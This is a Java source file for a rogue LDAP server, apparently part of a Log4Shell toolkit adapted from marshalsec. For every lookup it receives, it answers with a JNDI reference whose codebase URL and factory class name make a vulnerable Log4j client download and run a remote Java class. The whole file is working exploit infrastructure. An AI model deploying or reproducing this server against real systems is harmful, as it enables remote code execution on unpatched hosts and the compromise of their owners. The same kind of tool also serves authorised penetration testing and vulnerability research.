package xyz.terriblefriends.log4shelltools;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LDAPServer {
    /*
    Mostly stolen from https://www.github.com/mbechler/marshalsec
     */
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static final int DEFAULT_LISTEN_PORT = 1389;

    public static void main(String[] args) {
        int port = DEFAULT_LISTEN_PORT;
        if (args.length < 1) {
            System.err.println("Args: <URL> [<port>]");
            System.exit(1);
        }
        else if (args.length > 1) {
            try {
                port = Integer.parseInt(args[1]);
            }
            catch (NumberFormatException e) {
                System.err.println("Failed to parse port! Using default of " + port);
            }
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("LDAP server listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch (Exception e) {
            System.err.println("Unhandled exception in LDAP server!");
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private final URL rootUrl;

        public OperationInterceptor(URL cb) {
            this.rootUrl = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL responseUrl = new URL(this.rootUrl, base.concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + responseUrl);
            e.addAttribute("javaClassName", "pwnd");
            e.addAttribute("javaCodeBase", this.rootUrl.toString());
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", base);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}